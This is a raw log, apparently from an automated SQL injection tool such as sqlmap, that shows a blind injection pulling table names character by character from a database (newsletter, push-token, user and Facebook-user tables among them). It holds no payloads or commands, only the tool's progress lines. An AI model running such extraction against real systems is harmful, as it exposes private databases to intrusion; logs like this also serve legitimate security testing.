+[01:50:11] [INFO] retrieved: _____________[01:50:11] [INFO] retrieved: [01:50:30] [INFO] retrieved: a____________ 1/13 (7%)[01:50:41] [INFO] retrieved: ad___________ 2/13 (15%)[01:50:46] [INFO] retrieved: ad__e________ 3/13 (23%)[01:50:47] [INFO] retrieved: ad__e________ 4/13 (30%)[01:50:47] [INFO] retrieved: ad_ne________ 5/13 (38%)[01:51:03] [INFO] retrieved: ad_ne___e____ 6/13 (46%)[01:51:10] [INFO] retrieved: ad_ne_s_e____ 7/13 (53%)[01:51:10] [INFO] retrieved: ad_news_e____ 8/13 (61%)[01:51:17] [INFO] retrieved: ad_newsle____ 9/13 (69%)[01:51:27] [INFO] retrieved: ad_newsle__e_ 10/13 (76%)[01:51:31] [INFO] retrieved: ad_newslet_e_ 11/13 (84%)[01:51:35] [INFO] retrieved: ad_newslette_ 12/13 (92%)[01:51:35] [INFO] retrieved: ad_newsletter             [01:51:35] [INFO] retrieved: ad_newsletter
+[01:51:35] [INFO] retrieving the length of query output
+[01:51:35] [INFO] retrieved: 3
+[01:51:45] [INFO] retrieved: ___[01:51:45] [INFO] retrieved: [01:52:05] [INFO] retrieved: a__ 1/3 (33%)[01:52:09] [INFO] retrieved: a_s 2/3 (66%)[01:52:09] [INFO] retrieved: ads           [01:52:09] [INFO] retrieved: ads
+[01:52:09] [INFO] retrieving the length of query output
+[01:52:09] [INFO] retrieved: 8
+[01:52:19] [INFO] retrieved: ________[01:52:19] [INFO] retrieved: [01:52:51] [INFO] retrieved: a_______ 1/8 (12%)[01:53:01] [INFO] retrieved: ad______ 2/8 (25%)[01:53:03] [INFO] retrieved: ads_____ 3/8 (37%)[01:53:07] [INFO] retrieved: ads_____ 4/8 (50%)[01:53:13] [INFO] retrieved: ads___a_ 5/8 (62%)[01:53:14] [INFO] retrieved: ads_s_a_ 6/8 (75%)[01:53:22] [INFO] retrieved: ads_sta_ 7/8 (87%)[01:53:28] [INFO] retrieved: ads_stat           [01:53:28] [INFO] retrieved: ads_stat
+[01:53:28] [INFO] retrieving the length of query output
+[01:53:28] [INFO] retrieved: 9
+[01:53:39] [INFO] retrieved: _________[01:53:39] [INFO] retrieved: [01:53:58] [INFO] retrieved: a________ 1/9 (11%)[01:54:12] [INFO] retrieved: a___c____ 2/9 (22%)[01:54:17] [INFO] retrieved: a___c____ 3/9 (33%)[01:54:20] [INFO] retrieved: ap__c____ 4/9 (44%)[01:54:23] [INFO] retrieved: app_c____ 5/9 (55%)[01:54:38] [INFO] retrieved: app_c__e_ 6/9 (66%)[01:54:39] [INFO] retrieved: app_c_de_ 7/9 (77%)[01:54:39] [INFO] retrieved: app_code_ 8/9 (88%)[01:54:41] [INFO] retrieved: app_codes           [01:54:41] [INFO] retrieved: app_codes
+[01:54:41] [INFO] retrieving the length of query output
+[01:54:41] [INFO] retrieved: 14
+[01:54:50] [INFO] retrieved: ______________[01:54:50] [INFO] retrieved: [01:55:09] [INFO] retrieved: a_____________ 1/14 (7%)[01:55:24] [INFO] retrieved: a___c_________ 2/14 (14%)[01:55:28] [INFO] retrieved: a___c_________ 3/14 (21%)[01:55:34] [INFO] retrieved: ap__c_________ 4/14 (28%)[01:55:35] [INFO] retrieved: app_c_________ 5/14 (35%)[01:55:51] [INFO] retrieved: app_c_d_______ 6/14 (42%)[01:55:51] [INFO] retrieved: app_cod_______ 7/14 (50%)[01:55:52] [INFO] retrieved: app_code______ 8/14 (57%)[01:55:59] [INFO] retrieved: app_codes_____ 9/14 (64%)[01:56:08] [INFO] retrieved: app_codes__e__ 10/14 (71%)[01:56:21] [INFO] retrieved: app_codes_te__ 11/14 (78%)[01:56:23] [INFO] retrieved: app_codes_tem_ 12/14 (85%)[01:56:28] [INFO] retrieved: app_codes_tem_ 13/14 (92%)[01:56:30] [INFO] retrieved: app_codes_temp             [01:56:31] [INFO] retrieved: app_codes_temp
+[01:56:31] [INFO] retrieving the length of query output
+[01:56:31] [INFO] retrieved: 11
+[01:56:39] [INFO] retrieved: ___________[01:56:39] [INFO] retrieved: [01:56:59] [INFO] retrieved: a__________ 1/11 (9%)[01:57:17] [INFO] retrieved: a__________ 2/11 (18%)[01:57:17] [INFO] retrieved: a___d______ 3/11 (27%)[01:57:24] [INFO] retrieved: a_p_d______ 4/11 (36%)[01:57:24] [INFO] retrieved: app_d______ 5/11 (45%)[01:57:36] [INFO] retrieved: app_d__a___ 6/11 (54%)[01:57:42] [INFO] retrieved: app_de_a___ 7/11 (63%)[01:57:43] [INFO] retrieved: app_de_ai__ 8/11 (72%)[01:57:47] [INFO] retrieved: app_detai__ 9/11 (81%)[01:57:56] [INFO] retrieved: app_detail_ 10/11 (90%)[01:57:57] [INFO] retrieved: app_details             [01:57:57] [INFO] retrieved: app_details
+[01:57:57] [INFO] retrieving the length of query output
+[01:57:57] [INFO] retrieved: 4
+[01:58:02] [INFO] retrieved: ____[01:58:02] [INFO] retrieved: [01:58:16] [INFO] retrieved: a___ 1/4 (25%)[01:58:28] [INFO] retrieved: a__s 2/4 (50%)[01:58:33] [INFO] retrieved: ap_s 3/4 (75%)[01:58:34] [INFO] retrieved: apps           [01:58:34] [INFO] retrieved: apps
+[01:58:34] [INFO] retrieving the length of query output
+[01:58:34] [INFO] retrieved: 5
+[01:58:43] [INFO] retrieved: _____[01:58:43] [INFO] retrieved: [01:58:58] [INFO] retrieved: a____ 1/5 (20%)[01:59:07] [INFO] retrieved: a__i_ 2/5 (40%)[01:59:12] [INFO] retrieved: a_di_ 3/5 (60%)[01:59:13] [INFO] retrieved: audi_ 4/5 (80%)[01:59:18] [INFO] retrieved: audio           [01:59:18] [INFO] retrieved: audio
+[01:59:18] [INFO] retrieving the length of query output
+[01:59:18] [INFO] retrieved: 14
+[01:59:27] [INFO] retrieved: ______________[01:59:27] [INFO] retrieved: [01:59:51] [INFO] retrieved: b_____________ 1/14 (7%)[01:59:58] [INFO] retrieved: b_d___________ 2/14 (14%)[02:00:05] [INFO] retrieved: bod___________ 3/14 (21%)[02:00:05] [INFO] retrieved: bod___________ 4/14 (28%)[02:00:07] [INFO] retrieved: bod_c_________ 5/14 (35%)[02:00:09] [INFO] retrieved: bod_ca________ 6/14 (42%)[02:00:29] [INFO] retrieved: bod_ca_e______ 7/14 (50%)[02:00:29] [INFO] retrieved: bod_ca_eg_____ 8/14 (57%)[02:00:36] [INFO] retrieved: bod_categ_____ 9/14 (64%)[02:00:40] [INFO] retrieved: bod_catego____ 10/14 (71%)[02:00:54] [INFO] retrieved: bod_catego_i__ 11/14 (78%)[02:00:56] [INFO] retrieved: bod_catego_ie_ 12/14 (85%)[02:00:57] [INFO] retrieved: bod_categorie_ 13/14 (92%)[02:01:00] [INFO] retrieved: bod_categories             [02:01:00] [INFO] retrieved: bod_categories
+[02:01:00] [INFO] retrieving the length of query output
+[02:01:00] [INFO] retrieved: 13
+[02:01:14] [INFO] retrieved: _____________[02:01:14] [INFO] retrieved: [02:01:38] [INFO] retrieved: b____________ 1/13 (7%)[02:01:46] [INFO] retrieved: b_d__________ 2/13 (15%)[02:01:52] [INFO] retrieved: b_d__________ 3/13 (23%)[02:01:54] [INFO] retrieved: bod__________ 4/13 (30%)[02:02:00] [INFO] retrieved: bod_f________ 5/13 (38%)[02:02:15] [INFO] retrieved: bod_fo_______ 6/13 (46%)[02:02:30] [INFO] retrieved: bod_fol______ 7/13 (53%)[02:02:30] [INFO] retrieved: bod_foll_____ 8/13 (61%)[02:02:31] [INFO] retrieved: bod_follo____ 9/13 (69%)[02:02:39] [INFO] retrieved: bod_follow___ 10/13 (76%)[02:02:46] [INFO] retrieved: bod_followe__ 11/13 (84%)[02:02:49] [INFO] retrieved: bod_followe_s 12/13 (92%)[02:02:50] [INFO] retrieved: bod_followers             [02:02:50] [INFO] retrieved: bod_followers
+[02:02:50] [INFO] retrieving the length of query output
+[02:02:50] [INFO] retrieved: 19
+[02:03:03] [INFO] retrieved: ___________________[02:03:03] [INFO] retrieved: [02:03:26] [INFO] retrieved: b__________________ 1/19 (5%)[02:03:33] [INFO] retrieved: b_d________________ 2/19 (10%)[02:03:40] [INFO] retrieved: bod________________ 3/19 (15%)[02:03:41] [INFO] retrieved: bod________________ 4/19 (21%)[02:03:44] [INFO] retrieved: bod_i______________ 5/19 (26%)[02:03:54] [INFO] retrieved: bod_i___a__________ 6/19 (31%)[02:04:02] [INFO] retrieved: bod_in__a__________ 7/19 (36%)[02:04:03] [INFO] retrieved: bod_ins_a__________ 8/19 (42%)[02:04:14] [INFO] retrieved: bod_ins_a__a_______ 9/19 (47%)[02:04:18] [INFO] retrieved: bod_insta__a_______ 10/19 (52%)[02:04:19] [INFO] retrieved: bod_instag_a_______ 11/19 (57%)[02:04:27] [INFO] retrieved: bod_instagra_______ 12/19 (63%)[02:04:36] [INFO] retrieved: bod_instagram______ 13/19 (68%)[02:04:54] [INFO] retrieved: bod_instagram_p____ 14/19 (73%)[02:04:55] [INFO] retrieved: bod_instagram_po___ 15/19 (78%)[02:04:56] [INFO] retrieved: bod_instagram_po___ 16/19 (84%)[02:04:57] [INFO] retrieved: bod_instagram_pos__ 17/19 (89%)[02:05:08] [INFO] retrieved: bod_instagram_post_ 18/19 (94%)[02:05:08] [INFO] retrieved: bod_instagram_posts             [02:05:08] [INFO] retrieved: bod_instagram_posts
+[02:05:08] [INFO] retrieving the length of query output
+[02:05:08] [INFO] retrieved: 8
+[02:05:18] [INFO] retrieved: ________[02:05:18] [INFO] retrieved: [02:05:42] [INFO] retrieved: b_______ 1/8 (12%)[02:05:49] [INFO] retrieved: b_d_____ 2/8 (25%)[02:05:56] [INFO] retrieved: bod_____ 3/8 (37%)[02:05:57] [INFO] retrieved: bod_____ 4/8 (50%)[02:06:01] [INFO] retrieved: bod__a__ 5/8 (62%)[02:06:09] [INFO] retrieved: bod_la__ 6/8 (75%)[02:06:17] [INFO] retrieved: bod_lan_ 7/8 (87%)[02:06:18] [INFO] retrieved: bod_lang           [02:06:18] [INFO] retrieved: bod_lang
+[02:06:18] [INFO] retrieving the length of query output
+[02:06:18] [INFO] retrieved: 9
+[02:06:28] [INFO] retrieved: _________[02:06:28] [INFO] retrieved: [02:06:52] [INFO] retrieved: b________ 1/9 (11%)[02:06:58] [INFO] retrieved: b_d______ 2/9 (22%)[02:07:06] [INFO] retrieved: b_d______ 3/9 (33%)[02:07:07] [INFO] retrieved: bod______ 4/9 (44%)[02:07:17] [INFO] retrieved: bod__i___ 5/9 (55%)[02:07:22] [INFO] retrieved: bod_li___ 6/9 (66%)[02:07:29] [INFO] retrieved: bod_li_e_ 7/9 (77%)[02:07:32] [INFO] retrieved: bod_like_ 8/9 (88%)[02:07:33] [INFO] retrieved: bod_likes           [02:07:33] [INFO] retrieved: bod_likes
+[02:07:33] [INFO] retrieving the length of query output
+[02:07:33] [INFO] retrieved: 17
+[02:07:45] [INFO] retrieved: _________________[02:07:45] [INFO] retrieved: [02:08:10] [INFO] retrieved: b________________ 1/17 (5%)[02:08:17] [INFO] retrieved: b_d______________ 2/17 (11%)[02:08:20] [INFO] retrieved: b_d______________ 3/17 (17%)[02:08:23] [INFO] retrieved: bod______________ 4/17 (23%)[02:08:38] [INFO] retrieved: bod_n____________ 5/17 (29%)[02:08:43] [INFO] retrieved: bod_no___________ 6/17 (35%)[02:08:45] [INFO] retrieved: bod_no_i_________ 7/17 (41%)[02:08:55] [INFO] retrieved: bod_noti_________ 8/17 (47%)[02:08:58] [INFO] retrieved: bod_noti_i_______ 9/17 (52%)[02:08:59] [INFO] retrieved: bod_notifi_______ 10/17 (58%)[02:09:01] [INFO] retrieved: bod_notific______ 11/17 (64%)[02:09:07] [INFO] retrieved: bod_notifica_____ 12/17 (70%)[02:09:16] [INFO] retrieved: bod_notifica_i___ 13/17 (76%)[02:09:25] [INFO] retrieved: bod_notificati___ 14/17 (82%)[02:09:27] [INFO] retrieved: bod_notificatio__ 15/17 (88%)[02:09:31] [INFO] retrieved: bod_notification_ 16/17 (94%)[02:09:32] [INFO] retrieved: bod_notifications             [02:09:32] [INFO] retrieved: bod_notifications
+[02:09:32] [INFO] retrieving the length of query output
+[02:09:32] [INFO] retrieved: 9
+[02:09:42] [INFO] retrieved: _________[02:09:42] [INFO] retrieved: [02:10:06] [INFO] retrieved: b________ 1/9 (11%)[02:10:13] [INFO] retrieved: b_d______ 2/9 (22%)[02:10:21] [INFO] retrieved: bod______ 3/9 (33%)[02:10:22] [INFO] retrieved: bod______ 4/9 (44%)[02:10:43] [INFO] retrieved: bod_p____ 5/9 (55%)[02:10:43] [INFO] retrieved: bod_p_s__ 6/9 (66%)[02:10:44] [INFO] retrieved: bod_pos__ 7/9 (77%)[02:10:51] [INFO] retrieved: bod_post_ 8/9 (88%)[02:10:53] [INFO] retrieved: bod_posts           [02:10:53] [INFO] retrieved: bod_posts
+[02:10:53] [INFO] retrieving the length of query output
+[02:10:53] [INFO] retrieved: 15
+[02:11:05] [INFO] retrieved: _______________[02:11:05] [INFO] retrieved: [02:11:29] [INFO] retrieved: b______________ 1/15 (6%)[02:11:36] [INFO] retrieved: b_d____________ 2/15 (13%)[02:11:43] [INFO] retrieved: bod____________ 3/15 (20%)[02:11:44] [INFO] retrieved: bod____________ 4/15 (26%)[02:12:00] [INFO] retrieved: bod__u_________ 5/15 (33%)[02:12:06] [INFO] retrieved: bod_pu_________ 6/15 (40%)[02:12:07] [INFO] retrieved: bod_pus________ 7/15 (46%)[02:12:21] [INFO] retrieved: bod_push_______ 8/15 (53%)[02:12:34] [INFO] retrieved: bod_push__o____ 9/15 (60%)[02:12:35] [INFO] retrieved: bod_push_to____ 10/15 (66%)[02:12:42] [INFO] retrieved: bod_push_to____ 11/15 (73%)[02:12:43] [INFO] retrieved: bod_push_tok___ 12/15 (80%)[02:12:50] [INFO] retrieved: bod_push_toke__ 13/15 (86%)[02:12:58] [INFO] retrieved: bod_push_token_ 14/15 (93%)[02:13:03] [INFO] retrieved: bod_push_tokens             [02:13:03] [INFO] retrieved: bod_push_tokens
+[02:13:03] [INFO] retrieving the length of query output
+[02:13:03] [INFO] retrieved: 13
+[02:13:18] [INFO] retrieved: _____________[02:13:18] [INFO] retrieved: [02:13:43] [INFO] retrieved: b____________ 1/13 (7%)[02:13:49] [INFO] retrieved: b_d__________ 2/13 (15%)[02:13:57] [INFO] retrieved: bod__________ 3/13 (23%)[02:13:58] [INFO] retrieved: bod__________ 4/13 (30%)[02:14:06] [INFO] retrieved: bod_s________ 5/13 (38%)[02:14:13] [INFO] retrieved: bod_s_b______ 6/13 (46%)[02:14:14] [INFO] retrieved: bod_sub______ 7/13 (53%)[02:14:23] [INFO] retrieved: bod_sub_c____ 8/13 (61%)[02:14:29] [INFO] retrieved: bod_subsc____ 9/13 (69%)[02:14:30] [INFO] retrieved: bod_subsc_i__ 10/13 (76%)[02:14:34] [INFO] retrieved: bod_subscri__ 11/13 (84%)[02:14:36] [INFO] retrieved: bod_subscrib_ 12/13 (92%)[02:14:39] [INFO] retrieved: bod_subscribe             [02:14:39] [INFO] retrieved: bod_subscribe
+[02:14:39] [INFO] retrieving the length of query output
+[02:14:39] [INFO] retrieved: 9
+[02:14:49] [INFO] retrieved: _________[02:14:49] [INFO] retrieved: [02:15:14] [INFO] retrieved: b________ 1/9 (11%)[02:15:21] [INFO] retrieved: b_d______ 2/9 (22%)[02:15:27] [INFO] retrieved: b_d______ 3/9 (33%)[02:15:28] [INFO] retrieved: bod______ 4/9 (44%)[02:15:37] [INFO] retrieved: bod_u____ 5/9 (55%)[02:15:44] [INFO] retrieved: bod_us___ 6/9 (66%)[02:15:49] [INFO] retrieved: bod_use__ 7/9 (77%)[02:15:54] [INFO] retrieved: bod_user_ 8/9 (88%)[02:15:54] [INFO] retrieved: bod_users           [02:15:54] [INFO] retrieved: bod_users
+[02:15:54] [INFO] retrieving the length of query output
+[02:15:54] [INFO] retrieved: 12
+[02:16:06] [INFO] retrieved: ____________[02:16:06] [INFO] retrieved: [02:16:29] [INFO] retrieved: b___________ 1/12 (8%)[02:16:36] [INFO] retrieved: b_d_________ 2/12 (16%)[02:16:44] [INFO] retrieved: bod_________ 3/12 (25%)[02:16:44] [INFO] retrieved: bod_________ 4/12 (33%)[02:16:54] [INFO] retrieved: bod__e______ 5/12 (41%)[02:17:00] [INFO] retrieved: bod_ve______ 6/12 (50%)[02:17:09] [INFO] retrieved: bod_ver_____ 7/12 (58%)[02:17:10] [INFO] retrieved: bod_ver_i___ 8/12 (66%)[02:17:17] [INFO] retrieved: bod_versi___ 9/12 (75%)[02:17:29] [INFO] retrieved: bod_versio__ 10/12 (83%)[02:17:30] [INFO] retrieved: bod_versio_s 11/12 (91%)[02:17:32] [INFO] retrieved: bod_versions             [02:17:32] [INFO] retrieved: bod_versions
+[02:17:32] [INFO] retrieving the length of query output
+[02:17:32] [INFO] retrieved: 11
+[02:17:41] [INFO] retrieved: ___________[02:17:41] [INFO] retrieved: [02:18:06] [INFO] retrieved: c__________ 1/11 (9%)[02:18:14] [INFO] retrieved: cu_________ 2/11 (18%)[02:18:15] [INFO] retrieved: cus________ 3/11 (27%)[02:18:22] [INFO] retrieved: cust_______ 4/11 (36%)[02:18:39] [INFO] retrieved: custo______ 5/11 (45%)[02:18:40] [INFO] retrieved: custom_____ 6/11 (54%)[02:18:46] [INFO] retrieved: custom_u___ 7/11 (63%)[02:18:56] [INFO] retrieved: custom_u_e_ 8/11 (72%)[02:19:00] [INFO] retrieved: custom_u_e_ 9/11 (81%)[02:19:00] [INFO] retrieved: custom_use_ 10/11 (90%)[02:19:04] [INFO] retrieved: custom_user             [02:19:04] [INFO] retrieved: custom_user
+[02:19:04] [INFO] retrieving the length of query output
+[02:19:04] [INFO] retrieved: 19
+[02:19:19] [INFO] retrieved: ___________________[02:19:19] [INFO] retrieved: [02:19:43] [INFO] retrieved: c__________________ 1/19 (5%)[02:19:51] [INFO] retrieved: c_s________________ 2/19 (10%)[02:19:52] [INFO] retrieved: cus________________ 3/19 (15%)[02:19:57] [INFO] retrieved: cust_______________ 4/19 (21%)[02:20:16] [INFO] retrieved: custo______________ 5/19 (26%)[02:20:17] [INFO] retrieved: custom_____________ 6/19 (31%)[02:20:17] [INFO] retrieved: custom_u___________ 7/19 (36%)[02:20:32] [INFO] retrieved: custom_u_e_________ 8/19 (42%)[02:20:34] [INFO] retrieved: custom_u_e_________ 9/19 (47%)[02:20:40] [INFO] retrieved: custom_use_________ 10/19 (52%)[02:20:41] [INFO] retrieved: custom_user________ 11/19 (57%)[02:20:46] [INFO] retrieved: custom_user_a______ 12/19 (63%)[02:21:02] [INFO] retrieved: custom_user_a_d____ 13/19 (68%)[02:21:10] [INFO] retrieved: custom_user_and____ 14/19 (73%)[02:21:10] [INFO] retrieved: custom_user_andr___ 15/19 (78%)[02:21:17] [INFO] retrieved: custom_user_andr___ 16/19 (84%)[02:21:26] [INFO] retrieved: custom_user_andr_i_ 17/19 (89%)[02:21:28] [INFO] retrieved: custom_user_andr_id 18/19 (94%)[02:21:29] [INFO] retrieved: custom_user_android             [02:21:29] [INFO] retrieved: custom_user_android
+[02:21:29] [INFO] retrieving the length of query output
+[02:21:29] [INFO] retrieved: 16
+[02:21:41] [INFO] retrieved: ________________[02:21:41] [INFO] retrieved: [02:22:08] [INFO] retrieved: c_______________ 1/16 (6%)[02:22:17] [INFO] retrieved: cu______________ 2/16 (12%)[02:22:17] [INFO] retrieved: cus_____________ 3/16 (18%)[02:22:23] [INFO] retrieved: cust____________ 4/16 (25%)[02:22:42] [INFO] retrieved: custo___________ 5/16 (31%)[02:22:43] [INFO] retrieved: custom__________ 6/16 (37%)[02:22:51] [INFO] retrieved: custom_u________ 7/16 (43%)[02:22:59] [INFO] retrieved: custom_u_e______ 8/16 (50%)[02:23:00] [INFO] retrieved: custom_u_e______ 9/16 (56%)[02:23:06] [INFO] retrieved: custom_use______ 10/16 (62%)[02:23:14] [INFO] retrieved: custom_user_____ 11/16 (68%)[02:23:19] [INFO] retrieved: custom_user__a__ 12/16 (75%)[02:23:28] [INFO] retrieved: custom_user_la__ 13/16 (81%)[02:23:39] [INFO] retrieved: custom_user_la__ 14/16 (87%)[02:23:39] [INFO] retrieved: custom_user_lan_ 15/16 (93%)[02:23:40] [INFO] retrieved: custom_user_lang             [02:23:40] [INFO] retrieved: custom_user_lang
+[02:23:40] [INFO] retrieving the length of query output
+[02:23:40] [INFO] retrieved: 24
+[02:23:51] [INFO] retrieved: ________________________[02:23:51] [INFO] retrieved: [02:24:15] [INFO] retrieved: c_______________________ 1/24 (4%)[02:24:23] [INFO] retrieved: c_s_____________________ 2/24 (8%)[02:24:24] [INFO] retrieved: cus_____________________ 3/24 (12%)[02:24:30] [INFO] retrieved: cust____________________ 4/24 (16%)[02:24:46] [INFO] retrieved: custo___________________ 5/24 (20%)[02:24:47] [INFO] retrieved: custom__________________ 6/24 (25%)[02:24:55] [INFO] retrieved: custom_u________________ 7/24 (29%)[02:25:04] [INFO] retrieved: custom_u_e______________ 8/24 (33%)[02:25:05] [INFO] retrieved: custom_u_e______________ 9/24 (37%)[02:25:10] [INFO] retrieved: custom_use______________ 10/24 (41%)[02:25:19] [INFO] retrieved: custom_user_____________ 11/24 (45%)[02:25:21] [INFO] retrieved: custom_user__a__________ 12/24 (50%)[02:25:33] [INFO] retrieved: custom_user_la__________ 13/24 (54%)[02:25:43] [INFO] retrieved: custom_user_la_g________ 14/24 (58%)[02:25:46] [INFO] retrieved: custom_user_la_g________ 15/24 (62%)[02:25:50] [INFO] retrieved: custom_user_lang________ 16/24 (66%)[02:25:55] [INFO] retrieved: custom_user_lang_a______ 17/24 (70%)[02:26:13] [INFO] retrieved: custom_user_lang_a_d____ 18/24 (75%)[02:26:13] [INFO] retrieved: custom_user_lang_and____ 19/24 (79%)[02:26:13] [INFO] retrieved: custom_user_lang_and____ 20/24 (83%)[02:26:14] [INFO] retrieved: custom_user_lang_andr___ 21/24 (87%)[02:26:28] [INFO] retrieved: custom_user_lang_andr_i_ 22/24 (91%)[02:26:30] [INFO] retrieved: custom_user_lang_andr_id 23/24 (95%)[02:26:32] [INFO] retrieved: custom_user_lang_android             [02:26:32] [INFO] retrieved: custom_user_lang_android
+[02:26:32] [INFO] retrieving the length of query output
+[02:26:32] [INFO] retrieved: 14
+[02:26:40] [INFO] retrieved: ______________[02:26:40] [INFO] retrieved: [02:27:04] [INFO] retrieved: c_____________ 1/14 (7%)[02:27:12] [INFO] retrieved: cu____________ 2/14 (14%)[02:27:12] [INFO] retrieved: cus___________ 3/14 (21%)[02:27:19] [INFO] retrieved: cust__________ 4/14 (28%)[02:27:35] [INFO] retrieved: custo_________ 5/14 (35%)[02:27:36] [INFO] retrieved: custom________ 6/14 (42%)[02:27:43] [INFO] retrieved: custom_u______ 7/14 (50%)[02:27:52] [INFO] retrieved: custom_u_e____ 8/14 (57%)[02:27:53] [INFO] retrieved: custom_u_e____ 9/14 (64%)[02:27:58] [INFO] retrieved: custom_use____ 10/14 (71%)[02:28:06] [INFO] retrieved: custom_user___ 11/14 (78%)[02:28:13] [INFO] retrieved: custom_user__c 12/14 (85%)[02:28:17] [INFO] retrieved: custom_user_wc 13/14 (92%)[02:28:22] [INFO] retrieved: custom_user_wc             [02:28:22] [INFO] retrieved: custom_user_wc
+[02:28:22] [INFO] retrieving the length of query output
+[02:28:22] [INFO] retrieved: 14
+[02:28:31] [INFO] retrieved: ______________[02:28:31] [INFO] retrieved: [02:28:51] [INFO] retrieved: __a___________ 1/14 (7%)[02:28:55] [INFO] retrieved: e_a___________ 2/14 (14%)[02:28:56] [INFO] retrieved: e_ai__________ 3/14 (21%)[02:28:59] [INFO] retrieved: emai__________ 4/14 (28%)[02:29:12] [INFO] retrieved: email_________ 5/14 (35%)[02:29:22] [INFO] retrieved: email_f_______ 6/14 (42%)[02:29:29] [INFO] retrieved: email_fo______ 7/14 (50%)[02:29:37] [INFO] retrieved: email_fol_____ 8/14 (57%)[02:29:37] [INFO] retrieved: email_fol_____ 9/14 (64%)[02:29:45] [INFO] retrieved: email_fol_b___ 10/14 (71%)[02:30:04] [INFO] retrieved: email_fol_b___ 11/14 (78%)[02:30:06] [INFO] retrieved: email_fol_bl__ 12/14 (85%)[02:30:06] [INFO] retrieved: email_fol_blo_ 13/14 (92%)[02:30:07] [INFO] retrieved: email_fol_blog             [02:30:07] [INFO] retrieved: email_fol_blog
+[02:30:07] [INFO] retrieving the length of query output
+[02:30:07] [INFO] retrieved: 10
+[02:30:18] [INFO] retrieved: __________[02:30:18] [INFO] retrieved: [02:30:39] [INFO] retrieved: __a_______ 1/10 (10%)[02:30:44] [INFO] retrieved: e_a_______ 2/10 (20%)[02:30:44] [INFO] retrieved: e_ai______ 3/10 (30%)[02:30:49] [INFO] retrieved: emai______ 4/10 (40%)[02:31:06] [INFO] retrieved: email_____ 5/10 (50%)[02:31:07] [INFO] retrieved: email_s___ 6/10 (60%)[02:31:14] [INFO] retrieved: email_st__ 7/10 (70%)[02:31:18] [INFO] retrieved: email_sta_ 8/10 (80%)[02:31:22] [INFO] retrieved: email_sta_ 9/10 (90%)[02:31:25] [INFO] retrieved: email_stat             [02:31:25] [INFO] retrieved: email_stat
+[02:31:25] [INFO] retrieving the length of query output
+[02:31:25] [INFO] retrieved: 6
+[02:31:35] [INFO] retrieved: ______[02:31:35] [INFO] retrieved: [02:32:04] [INFO] retrieved: e_____ 1/6 (16%)[02:32:18] [INFO] retrieved: er____ 2/6 (33%)[02:32:19] [INFO] retrieved: err___ 3/6 (50%)[02:32:22] [INFO] retrieved: erro__ 4/6 (66%)[02:32:23] [INFO] retrieved: error_ 5/6 (83%)[02:32:30] [INFO] retrieved: errors           [02:32:30] [INFO] retrieved: errors
+[02:32:30] [INFO] retrieving the length of query output
+[02:32:30] [INFO] retrieved: 4
+[02:32:36] [INFO] retrieved: ____[02:32:36] [INFO] retrieved: [02:33:01] [INFO] retrieved: _b__ 1/4 (25%)[02:33:03] [INFO] retrieved: fb__ 2/4 (50%)[02:33:07] [INFO] retrieved: fb__ 3/4 (75%)[02:33:08] [INFO] retrieved: fb_p           [02:33:08] [INFO] retrieved: fb_p
+[02:33:08] [INFO] retrieving the length of query output
+[02:33:08] [INFO] retrieved: 5
+[02:33:16] [INFO] retrieved: _____[02:33:16] [INFO] retrieved: [02:33:39] [INFO] retrieved: _b___ 1/5 (20%)[02:33:46] [INFO] retrieved: fb___ 2/5 (40%)[02:33:50] [INFO] retrieved: fb__a 3/5 (60%)[02:33:50] [INFO] retrieved: fb__a 4/5 (80%)[02:33:51] [INFO] retrieved: fb_pa           [02:33:51] [INFO] retrieved: fb_pa
+[02:33:51] [INFO] retrieving the length of query output
+[02:33:51] [INFO] retrieved: 5
+[02:33:59] [INFO] retrieved: _____[02:33:59] [INFO] retrieved: [02:34:24] [INFO] retrieved: _b___ 1/5 (20%)[02:34:32] [INFO] retrieved: fb___ 2/5 (40%)[02:34:33] [INFO] retrieved: fb_u_ 3/5 (60%)[02:34:35] [INFO] retrieved: fb_u_ 4/5 (80%)[02:34:43] [INFO] retrieved: fb_up           [02:34:43] [INFO] retrieved: fb_up
+[02:34:43] [INFO] retrieving the length of query output
+[02:34:43] [INFO] retrieved: 7
+[02:34:50] [INFO] retrieved: _______[02:34:50] [INFO] retrieved: [02:35:13] [INFO] retrieved: _b_____ 1/7 (14%)[02:35:20] [INFO] retrieved: fb_____ 2/7 (28%)[02:35:21] [INFO] retrieved: fb_u___ 3/7 (42%)[02:35:26] [INFO] retrieved: fb_u___ 4/7 (57%)[02:35:34] [INFO] retrieved: fb_us__ 5/7 (71%)[02:35:35] [INFO] retrieved: fb_use_ 6/7 (85%)[02:35:37] [INFO] retrieved: fb_user           [02:35:37] [INFO] retrieved: fb_user
+[02:35:37] [INFO] retrieving the length of query output
+[02:35:37] [INFO] retrieved: 8
+[02:35:47] [INFO] retrieved: ________[02:35:47] [INFO] retrieved: [02:36:11] [INFO] retrieved: _b______ 1/8 (12%)[02:36:18] [INFO] retrieved: fb______ 2/8 (25%)[02:36:19] [INFO] retrieved: fb_u____ 3/8 (37%)[02:36:26] [INFO] retrieved: fb_u____ 4/8 (50%)[02:36:35] [INFO] retrieved: fb_us___ 5/8 (62%)[02:36:35] [INFO] retrieved: fb_use__ 6/8 (75%)[02:36:38] [INFO] retrieved: fb_user_ 7/8 (87%)[02:36:40] [INFO] retrieved: fb_user2           [02:36:40] [INFO] retrieved: fb_user2
+[02:36:40] [INFO] retrieving the length of query output
+[02:36:40] [INFO] retrieved: 9
+[02:36:49] [INFO] retrieved: _________[02:36:49] [INFO] retrieved: [02:37:15] [INFO] retrieved: ___e_____ 1/9 (11%)[02:37:16] [INFO] retrieved: __ee_____ 2/9 (22%)[02:37:23] [INFO] retrieved: _ree_____ 3/9 (33%)[02:37:23] [INFO] retrieved: free_____ 4/9 (44%)[02:37:40] [INFO] retrieved: free_u___ 5/9 (55%)[02:37:40] [INFO] retrieved: free_u_e_ 6/9 (66%)[02:37:45] [INFO] retrieved: free_use_ 7/9 (77%)[02:37:50] [INFO] retrieved: free_use_ 8/9 (88%)[02:37:52] [INFO] retrieved: free_user           [02:37:52] [INFO] retrieved: free_user
+[02:37:52] [INFO] retrieving the length of query output
+[02:37:52] [INFO] retrieved: 14
